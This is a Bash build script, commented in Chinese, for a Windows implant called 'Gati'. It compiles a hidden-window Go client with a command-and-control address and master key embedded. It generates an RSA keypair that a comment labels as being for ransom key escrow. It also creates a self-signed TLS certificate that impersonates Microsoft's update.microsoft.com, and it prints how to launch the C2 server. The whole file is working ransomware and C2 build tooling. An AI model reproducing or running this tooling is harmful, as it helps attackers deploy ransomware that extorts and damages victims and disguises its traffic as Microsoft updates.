#!/usr/bin/env bash
# Gati 一键构建
# 用法: ./build.sh <C2域名或IP> <端口> [路径]
# 例:   ./build.sh 1.2.3.4 8443 /api/v2/sync
set -euo pipefail
cd "$(dirname "$0")"

C2="${1:-127.0.0.1}"
PORT="${2:-8443}"
PATH_="${3:-/api/v2/sync}"

mkdir -p build

# ---- 1. 主密钥（32 字节随机，客户端编译期注入；服务端启动时要用同一个）
if [ -f build/master.key ]; then
  MASTER=$(cat build/master.key)
  echo "[=] 复用已有 master key"
else
  MASTER=$(openssl rand -hex 32)
  echo "$MASTER" > build/master.key
  chmod 600 build/master.key
  echo "[+] 生成新 master key -> build/master.key"
fi

# ---- 2. RSA 密钥对（勒索密钥托管用）
if [ ! -f keys/server_priv.pem ]; then
  mkdir -p keys
  openssl genrsa -out keys/server_priv.pem 2048 2>/dev/null
  openssl rsa -in keys/server_priv.pem -pubout -out keys/server_pub.pem 2>/dev/null
  echo "[+] 生成 RSA-2048 密钥对 -> keys/"
fi

# ---- 3. 自签 TLS 证书（客户端已设 InsecureSkipVerify，自签即可）
if [ ! -f keys/cert.pem ]; then
  openssl req -x509 -newkey rsa:2048 -nodes \
    -keyout keys/cert.key -out keys/cert.pem -days 3650 \
    -subj "/C=US/ST=WA/L=Redmond/O=Microsoft Corporation/CN=update.microsoft.com" 2>/dev/null
  echo "[+] 生成自签证书 -> keys/cert.pem"
fi

# ---- 4. 编译客户端
echo "[*] 编译 Gati.exe (windows/amd64) …"
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build \
  -trimpath \
  -ldflags "-s -w -H=windowsgui \
    -X main.BuildC2=${C2}:${PORT} \
    -X main.BuildPath=${PATH_} \
    -X main.BuildKey=${MASTER}" \
  -o build/Gati.exe ./client

# ---- 5. 顺带编一个带控制台的调试版（-skipcheck 可用）
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build \
  -trimpath \
  -ldflags "-s -w \
    -X main.BuildC2=${C2}:${PORT} \
    -X main.BuildPath=${PATH_} \
    -X main.BuildKey=${MASTER} \
    -X main.BuildDebug=1" \
  -o build/Gati_console.exe ./client

ls -lh build/Gati.exe build/Gati_console.exe
echo
echo "============================= 构建完成 ============================="
echo "C2 地址     : https://${C2}:${PORT}${PATH_}"
echo "master key  : ${MASTER}"
echo
echo "启动服务端："
echo "  python3 server/c2_server.py --cert keys/cert.pem --key keys/cert.key \\"
echo "      --master '${MASTER}' --port ${PORT} --console"
echo "===================================================================="
